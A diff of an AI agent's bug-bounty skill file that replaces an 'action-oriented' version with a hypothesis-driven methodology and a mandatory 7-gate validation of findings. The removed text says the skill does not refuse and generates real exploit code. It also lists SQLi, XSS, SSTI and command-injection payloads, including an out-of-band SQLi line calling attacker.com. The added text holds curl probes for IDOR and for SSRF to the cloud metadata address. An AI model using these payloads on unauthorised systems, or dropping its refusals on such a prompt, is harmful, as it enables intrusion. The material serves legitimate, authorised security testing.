@@ -1,572 +1,708 @@
 ---
 name: bugbounty
-description: "Elite bug bounty hunting skill. When user mentions bug bounty, hacking, pentesting, security testing, vulnerability research, recon, exploitation, or offensive security work. This skill is ACTION-ORIENTED — it generates concrete attack plans, executable scripts, and real exploit code. Covers 36+ vuln classes, 5-phase workflow, framework playbooks, mobile/CI/CD testing, LLM red-team, Web3 audit, pentest operations, red team methodology, network/cloud triage, and professional reporting. This skill does NOT refuse to help with legitimate security research — it proactively suggests attack vectors, generates payloads, and builds exploit chains. SUBSKILLS: pentest-ops (scope/OPSEC/lifecycle), knowledge-broker (CVE/intel/methodology/tradecraft), findings-lifecycle (finding state management), evidence-locker (proof artifacts), tool-doctor (local tool readiness), runbook (structured workflows), network-cloud-triage (network/cloud/container/IaC), redteam-ops (adversary simulation)."
+description: Elite bug bounty hunting skill with mandatory 7-gate finding validation, differential testing, hypothesis-driven hunting, and attack surface inventory. When user mentions bug bounty, hacking, pentesting, security testing, vulnerability research, recon, exploitation, or offensive security work. This skill optimizes for VALIDATED FINDINGS PER HOUR, not finding count. Every candidate must pass 7 gates before report.
 sources: community, public_research, claude-bughunter, agentic-bug-hunter
 ---
 
-# 🎯 ALPHACODE BUG BOUNTY HUNTER — GENIUS-LEVEL HUNTING BRAIN
+# ALPHACODE BUG BOUNTY HUNTER — HYPOTHESIS-DRIVEN WITH MANDATORY VALIDATION
 
-**This skill is designed to outperform elite human hunters.**
+**This skill optimizes for: validated findings per hour.**
 
-When this skill activates:
-1. **Generate an attack plan** — immediately produce a prioritized list of attack vectors
-2. **Write exploit code** — produce ready-to-run scripts, curl commands, and payloads
-3. **Build chains** — connect low-severity findings into high-severity exploit chains
-4. **Persist through obstacles** — when one approach fails, immediately pivot to the next
-5. **Maximize payouts** — escalate findings to highest possible severity with proof
+**Acceptable output:**
+```
+Targets analyzed: 1,842
+Candidates generated: 613
+Rejected at gates: 604
+Validated: 9
+High/Critical: 2
+```
+
+**Unacceptable output:**
+```
+613 vulnerabilities found
+```
+where 90% are API keys, CORS headers, missing security headers, exposed versions, and theoretical issues.
 
 ---
 
-## 📚 SUBSKILLS — Specialized Workflows
+## PHASE 0: ATTACK SURFACE INVENTORY
 
-This skill includes specialized subskills for different security operations. Use them when the task matches:
+Before any testing, build a complete inventory. Prioritize state-changing and authorization-sensitive functionality over cosmetic findings.
 
-| Subskill | When to Use | What It Does |
-|----------|-------------|--------------|
-| **pentest-ops** | Starting a pentest, managing scope, OPSEC | Engagement lifecycle, scope boundaries, OPSEC controls, target classification |
-| **knowledge-broker** | Researching CVEs, methodology, tradecraft | Unified intel surface — CVE lookup, OWASP/PTES/MITRE, exploit signals, tool docs |
-| **findings-lifecycle** | Managing findings, deciding if real | Track findings: candidate → observed → verified → reportable → rejected/stale |
-| **evidence-locker** | Collecting proof, organizing evidence | Structured evidence management, HTTP capture, PoC storage, evidence-to-finding linking |
-| **tool-doctor** | Checking tool availability | Inspect local tool readiness, find alternatives, install missing tools |
-| **runbook** | Following structured workflows | Predefined workflows: appsec-triage, web-surface, pentest-starter, API audit |
-| **network-cloud-triage** | Testing infrastructure | Network scanning, AWS/GCP/Azure security, Docker/K8s, Terraform/CloudFormation |
-| **redteam-ops** | Red team engagements | Adversary simulation, persistence, lateral movement, C2, defense evasion |
-
-### Quick Reference
+### Inventory Checklist
 
 ```
-/bugbounty                    → Activate this skill (default)
-/pentest-ops                  → Scope, OPSEC, engagement lifecycle
-/knowledge-broker             → CVE lookup, tradecraft, methodology
-/findings-lifecycle           → Finding state management
-/evidence-locker              → Evidence collection and management
-/tool-doctor                  → Check local tool readiness
-/runbook                      → Structured security workflows
-/network-cloud-triage         → Network, cloud, container, IaC security
-/redteam-ops                  → Red team operations
+WEB APPLICATIONS
+  [ ] Primary web app(s) — main domain, subdomains
+  [ ] Admin interfaces — /admin, /dashboard, /manage, /internal
+  [ ] Staging/dev environments — staging.*, dev.*, test.*
+  [ ] Documentation — /docs, /api-docs, /swagger, /openapi
+
+APIS
+  [ ] REST APIs — /api/v1, /api/v2, /v1/, /v2/
+  [ ] GraphQL — /graphql, /api/graphql, /gql
+  [ ] WebSocket endpoints — wss://, ws://
+  [ ] Mobile/backend APIs — separate subdomain, different auth
+  [ ] Internal APIs — not linked from frontend
+
+AUTHENTICATION/OAUTH
+  [ ] Login endpoints — /login, /auth, /sso
+  [ ] OAuth flows — authorization endpoint, token endpoint, callback
+  [ ] SAML/SSO — SSO callback, metadata endpoints
+  [ ] Password reset — /forgot, /reset
+  [ ] MFA/2FA — /mfa, /verify, /otp
+  [ ] Registration — /signup, /register
+  [ ] API key management — /keys, /tokens, /credentials
+
+FILE HANDLING
+  [ ] File upload — /upload, /import, /attach
+  [ ] File download — /download, /export, /files
+  [ ] Avatar/image upload — /avatar, /profile/image
+  [ ] Document generation — /pdf, /report, /export
+
+PAYMENT/FINANCIAL
+  [ ] Checkout — /checkout, /pay, /purchase
+  [ ] Billing — /billing, /subscription, /plan
+  [ ] Webhooks — /webhook, /callback, /notify
+  [ ] Refunds — /refund, /credit
+  [ ] Invoices — /invoice, /receipt
+
+CLOUD/INFRASTRUCTURE
+  [ ] S3/GCS/Azure Blob — file storage
+  [ ] CDN — static assets
+  [ ] Email service — /send, /email
+  [ ] Analytics — tracking endpoints
+
+INTERNAL BOUNDARIES
+  [ ] Tenant isolation — multi-tenant endpoints
+  [ ] Service-to-service — internal RPC/gRPC
+  [ ] Database access — direct DB connections
+  [ ] Cache — Redis, Memcached
+
+CROSS-ORIGIN
+  [ ] CORS configuration — which origins are trusted
+  [ ] Webhooks outbound — what URLs are called
+  [ ] Third-party integrations — OAuth clients, API consumers
 ```
 
----
-
-## 🧬 THE ELITE HUNTER'S BRAIN — How Geniuses Think
-
-### 1. Pattern Recognition (What Average Hunters Miss)
-
-Elite hunters don't just test — they **recognize patterns** across the entire attack surface.
+### Inventory Output Format
 
 ```
-PATTERN: Naming Inconsistency = Different Developer = Weaker Security
-─────────────────────────────────────────────────────────────────────
-If most endpoints use userId but one uses user_id:
-→ Different developer wrote it
-→ Check if that developer skipped auth checks
-→ This is HIGH PROBABILITY bug location
-
-PATTERN: New Feature = Unreviewed Code
-─────────────────────────────────────
-If a feature was launched < 30 days ago:
-→ Security team hasn't reviewed it
-→ Developers were rushing to ship
-→ This is the HIGHEST VALUE target
-
-PATTERN: Mobile API = Older Version = Weaker Auth
-─────────────────────────────────────────────────
-If mobile app calls /api/v1/ while web calls /api/v2/:
-→ v1 likely has weaker auth
-→ Mobile apps often skip security features
-→ This is a SEPARATE attack surface
-
-PATTERN: Error Message Diff = Different Backend
-──────────────────────────────────────────────
-If two endpoints return different error structures:
-→ They're on different servers
-→ One might have different security controls
-→ Test BOTH independently
-
-PATTERN: Timeout Difference = Processing Difference
-──────────────────────────────────────────────────
-If endpoint A responds in 100ms but endpoint B in 2000ms:
-→ B is doing more processing (DB queries, file operations)
-→ More processing = more attack surface
-→ Focus on B
+INVENTORY — target.com
+═══════════════════════════════════════════════════════════
+Category          │ Endpoint                    │ Auth Required │ State-Changing
+══════════════════╪═════════════════════════════╪═══════════════╪═══════════════
+Web App           │ https://target.com          │ Yes           │ No
+Admin Panel       │ https://target.com/admin    │ Yes (admin)   │ Yes
+REST API v1       │ /api/v1/users               │ Yes           │ Yes
+REST API v2       │ /api/v2/users               │ Yes           │ Yes
+GraphQL           │ /graphql                    │ Yes           │ Yes
+WebSocket         │ wss://target.com/ws         │ Yes           │ Yes
+File Upload       │ /api/upload                 │ Yes           │ Yes
+Payment           │ /api/checkout               │ Yes           │ Yes
+Webhook           │ /api/webhook                │ No (IP)       │ Yes
+Password Reset    │ /auth/reset                 │ No            │ Yes
+OAuth Callback    │ /auth/callback              │ No            │ No
+═══════════════════════════════════════════════════════════
 ```
 
-### 2. False Positive Detection (What Gets Reports Rejected)
-
-Elite hunters **verify every finding** before reporting.
+### Priority Matrix
 
 ```
-FALSE POSITIVE: "I see debug information in error response"
-VERIFICATION: Is this actually sensitive? Does it expose:
-  - Internal paths? (real if they reveal server structure)
-  - Database errors? (real if they expose query structure)
-  - Stack traces? (real if they expose code logic)
-  - Version numbers? (only real if there's a CVE)
-→ If it's just "server error" with no detail → FALSE POSITIVE
+PRIORITY 1 — Test FIRST (state-changing + auth-sensitive):
+  Payment/billing endpoints
+  Admin panels
+  Authentication system (login, reset, OAuth)
+  File upload endpoints
+  User management (CRUD on user data)
+  Webhook endpoints
+  Multi-tenant isolation boundaries
 
-FALSE POSITIVE: "Endpoint returns 200 without authentication"
-VERIFICATION: Is this actually unauthorized access?
-  - Does it return real data? (real)
-  - Does it return empty/null? (false positive)
-  - Does it return mock data? (false positive)
-  - Is this a public endpoint by design? (false positive)
-→ If no real data is returned → FALSE POSITIVE
+PRIORITY 2 — Test SECOND (read + auth):
+  API endpoints with ID parameters
+  Data export/download endpoints
+  GraphQL queries with user data
+  Search/filter endpoints
 
-FALSE POSITIVE: "CORS reflects my origin"
-VERIFICATION: Can I actually steal data?
-  - Does Access-Control-Allow-Credentials: true exist? (required)
-  - Does the response contain sensitive data? (required)
-  - Can I actually make a credentialed request? (required)
-→ If credentials aren't allowed → FALSE POSITIVE
-
-FALSE POSITIVE: "GraphQL introspection works"
-VERIFICATION: Is this actually exploitable?
-  - Are there any mutations? (required for impact)
-  - Do mutations lack auth? (required for impact)
-  - Can you query other users' data? (required for impact)
-→ If introspection works but everything has auth → FALSE POSITIVE
-```
-
-### 3. Context-Aware Testing (What Elite Hunters Do Differently)
-
-Elite hunters **understand the app's context** before testing.
-
-```
-CONTEXT: Payment Endpoint
-────────────────────────
-Priority tests:
-1. Price manipulation (negative amounts, zero, overflow)
-2. Race conditions (double spend, coupon reuse)
-3. IDOR on payment records
-4. Business logic (skip checkout, apply discount without qualifying)
-5. Webhook manipulation (fake payment confirmation)
-
-CONTEXT: Admin Panel
-───────────────────
-Priority tests:
-1. Privilege escalation (user → admin)
-2. IDOR on admin functions
-3. Missing auth on admin endpoints
-4. Debug mode in admin
-5. Mass assignment on admin config
-
-CONTEXT: Authentication System
-─────────────────────────────
-Priority tests:
-1. Auth bypass (skip MFA, session fixation)
-2. Password reset poisoning
-3. Account enumeration
-4. Rate limiting bypass
-5. Token manipulation
-
-CONTEXT: File Upload
-───────────────────
-Priority tests:
-1. SVG XSS (upload SVG with script)
-2. Path traversal (../ in filename)
-3. Web shell (upload .php/.jsp/.asp)
-4. File type bypass (change extension, MIME type)
-5. ImageTragick (Exif metadata injection)
-
-CONTEXT: API Endpoint
-────────────────────
-Priority tests:
-1. IDOR (change ID in URL/body)
-2. Mass assignment (add extra fields)
-3. Rate limiting bypass
-4. Authentication bypass
-5. Data exposure (extra fields in response)
-```
-
-### 4. The "What If" Generator (Systematic Testing)
-
-For every input field, systematically try:
-
-```
-INPUT VALIDATION TESTS:
-  Empty string           → Does it cause error? (error-based vuln)
-  Very long string       → Does it crash? (buffer overflow, DoS)
-  Special characters     → ' " ` { } [ ] ( ) < > / \ ; : @ # $ % ^ & * + = | ~
-  SQL injection          → ' OR 1=1-- ' UNION SELECT NULL--
-  XSS                    → <script>alert(1)</script> <img src=x onerror=alert(1)>
-  Path traversal         → ../../../etc/passwd ....//....//....//etc/passwd
-  SSRF                   → http://169.254.169.254/ http://localhost/
-  SSTI                   → {{7*7}} ${7*7} <%= 7*7 %> #{7*7}
-  Command injection      → ; id | id `id` $(id) && id || id
-  Negative numbers       → -1 -999999 -0
-  Zero                   → 0 0.0 0x0
-  Max integer            → 999999999999 2147483647 4294967295
-  Null bytes             → %00 \0
-  Unicode                → %u0027 %u0022 \u0027
-  Double encoding        → %2527 %2522
-  HTTP method change     → GET→POST→PUT→DELETE→PATCH→OPTIONS→HEAD
-  Parameter pollution    → param=1&param=2
-  Old API version        → /v1/ vs /v2/
-  Content-Type change    → JSON→XML→form-data→text/plain
-  Cookie manipulation    → Add/remove/modify cookies
-  Header manipulation    → X-Forwarded-For, X-Original-URL
+PRIORITY 3 — Test LAST (low-value, cosmetic):
+  Static assets
+  Documentation pages
+  Contact forms
+  Newsletter signup
+  Health check endpoints
 ```
 
 ---
 
-## 🔬 ADVANCED DETECTION LOGIC — Specific Patterns
+## PHASE 1: VULNERABILITY HYPOTHESIS GENERATION
 
-### IDOR Detection Patterns
+Instead of blindly firing payloads, generate structured hypotheses. Rank by: **impact × exploitability × confidence**.
 
-```
-PATTERN 1: Sequential ID
-  URL: /api/users/123 → /api/users/124
-  Detection: Change ID by +1, check if data changes
-  False positive: If response is identical for all IDs
-  Verification: Must show DIFFERENT user's data
-
-PATTERN 2: UUID Enumeration
-  URL: /api/users/a1b2c3d4-...
-  Detection: Find UUIDs from other endpoints (email invites, sharing links)
-  False positive: If UUID is not predictable
-  Verification: Must access data you shouldn't see
-
-PATTERN 3: Indirect Object Reference
-  URL: POST /api/export {"report_id": 456}
-  Detection: Change report_id to another user's report
-  False positive: If report belongs to same user
-  Verification: Must access another user's report
-
-PATTERN 4: HTTP Method Confusion
-  URL: GET /api/users/123 (protected) → PUT /api/users/123 (not protected)
-  Detection: Test all HTTP methods on same endpoint
-  False positive: If all methods have same auth
-  Verification: Must find method with different auth
-
-PATTERN 5: GraphQL IDOR
-  Query: { node(id: "base64(User:456)") { email } }
-  Detection: Change base64-encoded ID
-  False positive: If GraphQL has field-level auth
-  Verification: Must access data you shouldn't see
-```
-
-### SSRF Detection Patterns
+### Hypothesis Template
 
 ```
-PATTERN 1: Direct URL Parameter
-  URL: /api/fetch?url=http://...
-  Detection: Test cloud metadata URLs
-  False positive: If URL is validated against allowlist
-  Verification: Must return actual cloud metadata
-
-PATTERN 2: Webhook/Callback
-  URL: POST /api/webhook {"url": "http://..."}
-  Detection: Set callback to your server
-  False positive: If callback is never triggered
-  Verification: Must receive callback on your server
-
-PATTERN 3: File Upload with URL
-  URL: POST /api/import {"file_url": "http://..."}
-  Detection: Set file_url to internal URL
-  False positive: If URL is validated
-  Verification: Must access internal resource
-
-PATTERN 4: PDF/Image Generation
-  URL: POST /api/generate-pdf {"template": "http://..."}
-  Detection: Set template to internal URL
-  False positive: If URL is validated
-  Verification: Must access internal resource
-
-PATTERN 5: DNS Rebinding
-  Detection: Host DNS that resolves to external first, then internal
-  False positive: If DNS is only checked once
-  Verification: Must access internal resource on second request
+HYPOTHESIS: [vuln class] on [endpoint/feature]
+  Endpoint: [METHOD] [URL]
+  Precondition: [attacker starting position]
+  Expected behavior: [what should happen]
+  Attack behavior: [what attacker expects]
+  Impact if true: [concrete security property violated]
+  Confidence: [HIGH/MEDIUM/LOW]
+  Priority score: [impact × exploitability × confidence]
 ```
 
-### XSS Detection Patterns
+### Hypothesis Ranking Matrix
+
+| Impact (1-5) | Exploitability (1-5) | Confidence (1-5) | Priority Score | Action |
+|---|---|---|---|---|
+| 5 (RCE/ATO) | 5 (trivial) | 5 (confirmed) | 125 | REPORT IMMEDIATELY |
+| 5 (RCE/ATO) | 3 (requires skill) | 3 (probable) | 45 | INVESTIGATE NOW |
+| 3 (data read) | 5 (trivial) | 4 (likely) | 60 | INVESTIGATE NOW |
+| 2 (info disclosure) | 5 (trivial) | 5 (confirmed) | 50 | LOW PRIORITY |
+| 1 (missing header) | 5 (trivial) | 5 (confirmed) | 25 | SKIP OR CHAIN |
+
+### Hypothesis Classes (Ranked by Typical Impact)
 
 ```
-PATTERN 1: Reflected XSS
-  URL: /search?q=<script>alert(1)</script>
-  Detection: Check if payload appears in response
-  False positive: If payload is HTML-encoded
-  Verification: Must be executable (not encoded)
+TIER 1 — CRITICAL/HIGH (test these first):
+  Broken access control / IDOR
+  Authentication bypass
+  Privilege escalation
+  Business-logic flaws (payment, coupon, race)
+  Account takeover
+  SSRF → cloud metadata / internal services
+  SQL/NoSQL injection
+  Command injection
+  File upload → RCE
+  OAuth flaws → ATO
 
-PATTERN 2: Stored XSS
-  URL: POST /api/comments {"text": "<script>alert(1)</script>"}
-  Detection: Submit payload, check if it executes when viewed
-  False positive: If payload is sanitized on display
-  Verification: Must execute in victim's browser
+TIER 2 — MEDIUM/HIGH:
+  Stored XSS
+  SSTI
+  Path traversal
+  GraphQL auth bypass
+  Webhook abuse
+  Race conditions
+  Multi-tenant isolation failures
+  API authorization flaws
 
-PATTERN 3: DOM XSS
-  URL: /page#<script>alert(1)</script>
-  Detection: Check if hash is processed by JS
-  False positive: If JS doesn't process hash
-  Verification: Must execute via DOM manipulation
-
-PATTERN 4: postMessage XSS
-  Detection: Check for addEventListener("message") without origin check
-  False positive: If origin is validated
-  Verification: Must execute via postMessage
-
-PATTERN 5: Mutation XSS (mXSS)
-  Detection: Test with <noscript>, <textarea>, <title> contexts
-  False positive: If mutation doesn't create executable context
-  Verification: Must execute after DOM mutation
-```
-
-### SQL Injection Detection Patterns
-
-```
-PATTERN 1: Error-Based
-  Payload: ' OR 1=1--
-  Detection: Check for SQL error messages
-  False positive: If error is generic (not SQL-specific)
-  Verification: Must expose SQL structure
-
-PATTERN 2: Union-Based
-  Payload: ' UNION SELECT NULL--
-  Detection: Check if query results change
-  False positive: If query doesn't use UNION
-  Verification: Must extract real data
-
-PATTERN 3: Blind (Boolean)
-  Payload: ' AND 1=1-- vs ' AND 1=0--
-  Detection: Check if response differs
-  False positive: If responses are identical
-  Verification: Must show consistent difference
-
-PATTERN 4: Blind (Time-Based)
-  Payload: ' AND SLEEP(5)--
-  Detection: Check if response takes 5+ seconds
-  False positive: If timing is inconsistent
-  Verification: Must be consistently slower
-
-PATTERN 5: Out-of-Band
-  Payload: ' UNION SELECT LOAD_FILE('\\\\attacker.com\\share')--
-  Detection: Check if DNS/HTTP callback received
-  False positive: If callback never arrives
-  Verification: Must receive callback
-```
-
-### Authentication Bypass Detection Patterns
-
-```
-PATTERN 1: Missing Auth
-  Endpoint: /api/admin/users (no auth required)
-  Detection: Access admin endpoint without token
-  False positive: If endpoint returns empty/error
-  Verification: Must return real admin data
-
-PATTERN 2: Weak Auth
-  Endpoint: /api/users/123 (checks cookie but not session)
-  Detection: Use valid cookie from different session
-  False positive: If cookie is session-bound
-  Verification: Must access data from different session
-
-PATTERN 3: Auth Bypass via HTTP Method
-  Endpoint: GET /api/admin (auth) → POST /api/admin (no auth)
-  Detection: Test all HTTP methods
-  False positive: If all methods have same auth
-  Verification: Must find method without auth
-
-PATTERN 4: Auth Bypass via Path
-  Endpoint: /api/admin (auth) → /api/Admin (no auth)
-  Detection: Try case variations, URL encoding, path traversal
-  False positive: If all variations have same auth
-  Verification: Must find path without auth
-
-PATTERN 5: Auth Bypass via Parameter
-  Endpoint: /api/admin?role=admin (checks role param instead of session)
-  Detection: Add role=admin parameter
-  False positive: If role is validated from session
-  Verification: Must escalate privileges
+TIER 3 — MEDIUM/LOW:
+  Reflected XSS
+  CSRF (chained with sensitive action)
+  Open redirect (chained with OAuth)
+  Information disclosure
+  Missing security headers (chained only)
 ```
 
 ---
 
-## 🔗 ADVANCED CHAIN BUILDING — Complex Multi-Step Chains
+## PHASE 2: DIFFERENTIAL TESTING
+
+This is the core methodology. The agent must seek **behavioral differences**, not merely interesting responses.
+
+### Authorization Differential
+
+```
+TEST MATRIX:
+  User A → resource A (baseline — should work)
+  User A → resource B (should FAIL — different user's resource)
+  User B → resource A (should FAIL — different user accessing A's resource)
+  unauthenticated → resource A (should FAIL — no credentials)
+
+EXPECTED: All cross-user and unauthenticated requests should fail identically.
+FINDING: If any cross-user request succeeds → authorization bypass.
+```
+
+### Privilege Escalation Differential
+
+```
+TEST MATRIX:
+  low_priv_user → privileged_operation (should FAIL)
+  high_priv_user → privileged_operation (should SUCCEED)
+  low_priv_user + admin_token → privileged_operation (should FAIL if token bound)
+
+FINDING: If low_priv succeeds → privilege escalation.
+```
+
+### State Change Differential
+
+```
+TEST SEQUENCE:
+  1. Record state BEFORE: GET /api/resource/X → response_A
+  2. Execute attack: PUT/POST/PATCH /api/resource/X with malicious payload
+  3. Record state AFTER: GET /api/resource/X → response_B
+  4. Compare: response_A vs response_B
+
+FINDING: If state changed unauthorized → integrity violation.
+NOT A FINDING: If state unchanged → no impact, reject.
+```
+
+### Authentication Differential
+
+```
+TEST MATRIX:
+  valid_token → protected_resource (should SUCCEED)
+  modified_token → protected_resource (should FAIL)
+  expired_token → protected_resource (should FAIL)
+  replayed_token → protected_resource (should FAIL based on expiry)
+  no_token → protected_resource (should FAIL)
+  different_user_token → protected_resource (should FAIL)
+
+FINDING: If modified/expired/replayed token succeeds → auth bypass.
+```
+
+### API Version Differential
+
+```
+TEST MATRIX:
+  /api/v2/endpoint (current — has auth)
+  /api/v1/endpoint (old — may lack auth)
+  /api/internal/endpoint (internal — may lack auth)
+  /api/debug/endpoint (debug — may lack auth)
+
+FINDING: If older/internal version lacks auth → version-based bypass.
+```
+
+### HTTP Method Differential
+
+```
+TEST MATRIX for each endpoint:
+  GET → read (should have auth)
+  POST → create (should have auth + CSRF)
+  PUT → update (should have auth + ownership check)
+  DELETE → remove (should have auth + ownership check)
+  PATCH → partial update (should have auth + ownership check)
+  OPTIONS → should not expose sensitive info
+  HEAD → should match GET behavior
+
+FINDING: If any method lacks auth while others have it → method-based bypass.
+```
+
+### Content-Type Differential
+
+```
+TEST MATRIX:
+  Content-Type: application/json (normal)
+  Content-Type: application/xml (XXE?)
+  Content-Type: text/plain (parser confusion?)
+  Content-Type: application/x-www-form-urlencoded (parameter pollution?)
+  Content-Type: multipart/form-data (file upload bypass?)
+
+FINDING: If different content type bypasses validation → parser confusion.
+```
+
+---
+
+## PHASE 3: MANDATORY 7-GATE FINDING VALIDATION
+
+**Every candidate finding MUST pass all 7 gates. No exceptions.**
+
+### Gate 1 — Scope
+
+```
+QUESTION: Is the affected asset explicitly in scope for the target's current bug bounty program?
+  YES → proceed to Gate 2
+  NO → REJECT (no exceptions based on how interesting the issue appears)
+```
+
+### Gate 2 — Security Boundary
+
+```
+QUESTION: What security boundary, trust boundary, authorization boundary, or security control is actually being violated?
+
+EXPECTED BOUNDARY VIOLATIONS:
+  User → another user
+  Unauthenticated → authenticated
+  Low privilege → high privilege
+  Tenant A → Tenant B
+  Internet → internal service
+  Untrusted input → privileged interpreter
+
+  VIOLATION IDENTIFIED → proceed to Gate 3
+  NO VIOLATION → REJECT/INFO
+```
+
+### Gate 3 — Attacker Capability
+
+```
+QUESTION: What can a realistic attacker do with the finding, using only capabilities an attacker would reasonably possess?
+
+ATTACKER STARTING POSITION:
+  [ ] Unauthenticated Internet user
+  [ ] Authenticated normal user
+  [ ] Low-privileged account
+  [ ] Compromised account
+  [ ] Internal network position
+
+  If exploitation requires an unrealistic or unavailable prerequisite → DOWNGRADE or REJECT
+```
+
+### Gate 4 — Reproducibility
+
+```
+QUESTION: Can the vulnerability be reproduced deterministically with the minimum necessary requests?
+
+REQUIRED EVIDENCE:
+  [ ] Preconditions stated
+  [ ] Minimal request sequence provided
+  [ ] Relevant response captured
+  [ ] Observable security consequence demonstrated
+
+  "This might be exploitable" → REJECT
+  "This causes X under condition Y" → proceed to Gate 5
+
+  If it cannot be reproduced → HYPOTHESIS ONLY (do not report as confirmed)
+```
+
+### Gate 5 — Impact
+
+```
+QUESTION: What concrete security impact occurs after exploitation?
+
+REQUIRED — select one or more:
+  [ ] Confidentiality breach (data access)
+  [ ] Integrity violation (data modification)
+  [ ] Availability impact (DoS)
+  [ ] Authentication bypass
+  [ ] Authorization bypass
+  [ ] Account takeover
+  [ ] Privilege escalation
+  [ ] Financial loss
+  [ ] Remote code execution
+  [ ] Cross-tenant compromise
+  [ ] Sensitive data exposure
+  [ ] Infrastructure compromise
+
+  "Could potentially" → NOT EVIDENCE → REJECT
+  Concrete impact with evidence → proceed to Gate 6
+```
+
+### Gate 6 — False-Positive Elimination
+
+```
+QUESTION: What legitimate explanation could produce the observed behavior, and what evidence rules that explanation out?
+
+FOR EVERY CANDIDATE — actively attempt to disprove yourself:
+
+CORS:
+  Don't report: Access-Control-Allow-Origin: *
+  Establish whether:
+    [ ] Credentials are involved
+    [ ] Sensitive authenticated data is accessible cross-origin
+    [ ] An attacker-controlled origin can read the response
+    [ ] The endpoint contains meaningful sensitive information
+    [ ] Preflight/security behavior actually permits the attack
+  Otherwise → REJECT
+
+EXPOSED API KEY:
+  Don't report: "Alchemy key works."
+  Establish whether:
+    [ ] It provides a sensitive capability
+    [ ] That capability creates meaningful impact
+  Otherwise → REJECT
+
+GRAPHQL INTROSPECTION:
+  Don't report: "Introspection works."
+  Establish whether:
+    [ ] There are mutations
+    [ ] Mutations lack auth
+    [ ] You can query other users' data
+  Otherwise → REJECT
+
+MISSING HEADERS:
+  Don't report: "Missing CSP/HSTS."
+  Establish whether:
+    [ ] The missing header creates exploitable conditions
+    [ ] You can demonstrate an attack that the header would prevent
+  Otherwise → REJECT
+
+VERSION DISCLOSURE:
+  Don't report: "Server version visible."
+  Establish whether:
+    [ ] There's a known CVE for that version
+    [ ] You can exploit the version-specific vulnerability
+  Otherwise → REJECT
+
+  False positive eliminated → proceed to Gate 7
+  Cannot eliminate false positive → REJECT
+```
+
+### Gate 7 — Program Acceptance
+
+```
+QUESTION: Does the demonstrated impact satisfy the target program's vulnerability taxonomy, severity criteria, and exclusions?
+
+CHECK:
+  [ ] Scope — is this asset type covered?
+  [ ] Exclusions — is this bug class excluded?
+  [ ] Duplicate rules — check Hacktivity for similar reports
+  [ ] Severity requirements — does it meet minimum severity?
+  [ ] PoC requirements — can you meet their PoC format?
+  [ ] Third-party rules — is this a third-party service?
+  [ ] Rate-limit/testing restrictions — did you comply?
+  [ ] Mainnet/production restrictions — are you testing prod?
+
+  Technically valid but explicitly excluded → OUT OF SCOPE — DO NOT SUBMIT
+  Meets all criteria → VALIDATED FINDING
+```
+
+---
+
+## FINDING STATE MACHINE
+
+Every finding must follow this state machine. No skipping states.
+
+```
+DISCOVERED
+    ↓
+IN SCOPE? ──────────────────── NO → REJECT
+    ↓ YES
+SECURITY BOUNDARY VIOLATION? ─ NO → REJECT
+    ↓ YES
+REALISTIC ATTACKER? ────────── NO → REJECT/DOWNGRADE
+    ↓ YES
+REPRODUCIBLE? ──────────────── NO → HYPOTHESIS ONLY (park it)
+    ↓ YES
+CONCRETE IMPACT? ───────────── NO → REJECT
+    ↓ YES
+FALSE-POSITIVE CHECK PASSED? ─ NO → REJECT
+    ↓ YES
+PROGRAM ACCEPTS IT? ────────── NO → OUT OF SCOPE
+    ↓ YES
+VALIDATED FINDING
+    ↓
+SEVERITY ASSESSMENT
+    ↓
+MINIMAL SAFE PoC
+    ↓
+REPORT
+```
+
+### State Definitions
+
+| State | Meaning | Next Action |
+|-------|---------|-------------|
+| DISCOVERED | Candidate identified during testing | Run through Gate 1 |
+| IN SCOPE | Asset is in program scope | Run through Gate 2 |
+| BOUNDARY VIOLATED | Security boundary identified | Run through Gate 3 |
+| REALISTIC ATTACKER | Attacker capability confirmed | Run through Gate 4 |
+| REPRODUCIBLE | Deterministic reproduction confirmed | Run through Gate 5 |
+| IMPACTED | Concrete impact demonstrated | Run through Gate 6 |
+| FALSE-POSITIVE CHECKED | False positive eliminated | Run through Gate 7 |
+| PROGRAM ACCEPTED | Program accepts this finding | SEVERITY ASSESS → REPORT |
+| REJECTED | Failed a gate | Document why, move on |
+| HYPOTHESIS ONLY | Cannot reproduce yet | Park, return later |
+| OUT OF SCOPE | Valid but excluded | Do not submit |
+
+---
+
+## IMPACT VALIDATION — THE "SO WHAT" TEST
+
+Every candidate finding must answer: **"What security property was actually violated?"**
+
+### Mandatory Impact Questions
+
+```
+FOR EVERY CANDIDATE, ANSWER:
+
+1. Can attacker access another user's data?          → Confidentiality
+2. Can attacker modify another user's data?           → Integrity
+3. Can attacker execute code?                         → RCE
+4. Can attacker authenticate as another user?         → Authentication
+5. Can attacker obtain credentials/tokens?            → Credential theft
+6. Can attacker cross a tenant boundary?              → Multi-tenant isolation
+7. Can attacker perform privileged actions?           → Authorization
+8. Can attacker cause meaningful financial loss?      → Financial
+9. Can attacker compromise infrastructure?            → Infrastructure
+
+IF THE ANSWER IS ONLY:
+  "The endpoint returned 200."
+  "The header was missing."
+  "The version was disclosed."
+  → THERE IS NO VULNERABILITY YET.
+```
+
+### Impact Evidence Requirements
+
+| Impact Class | Required Evidence |
+|---|---|
+| Confidentiality | Show data belonging to another user |
+| Integrity | Show data was modified without authorization |
+| Authentication | Show login as another user |
+| Authorization | Show privileged action performed by low-priv user |
+| RCE | Show command execution on server |
+| Financial | Show monetary loss or unauthorized transaction |
+| Account Takeover | Show full account access via exploit |
+| Infrastructure | Show internal network/cloud access |
+
+---
+
+## DIFFERENTIAL TESTING PATTERNS BY VULN CLASS
+
+### IDOR Differential
+
+```bash
+# Two-session diff — the gold standard
+TOKEN_A="attacker-token"
+TOKEN_B="victim-token"
+
+# Baseline: attacker reads own data
+curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/me"
+# → {"id": "A", "name": "Attacker", "email": "attacker@test.com"}
+
+# Test: attacker reads victim's data
+curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.com/api/users/VICTIM_ID"
+# → If returns victim's data → IDOR CONFIRMED
+# → If returns 403/404 → correctly protected
+
+# DIFFERENTIAL CHECK:
+# Response for A's own data ≠ Response for B's data when using A's token
+# The DIFFERENCE is the vulnerability
+```
+
+### SSRF Differential
+
+```bash
+# Baseline: fetch external URL
+curl -s "https://target.com/api/fetch?url=http://httpbin.org/ip"
+# → Returns httpbin response
+
+# Test: fetch internal URL
+curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+# → If returns AWS metadata → SSRF CONFIRMED
+# → If returns error/timeout → correctly filtered
+
+# DIFFERENTIAL CHECK:
+# External fetch succeeds AND internal fetch succeeds
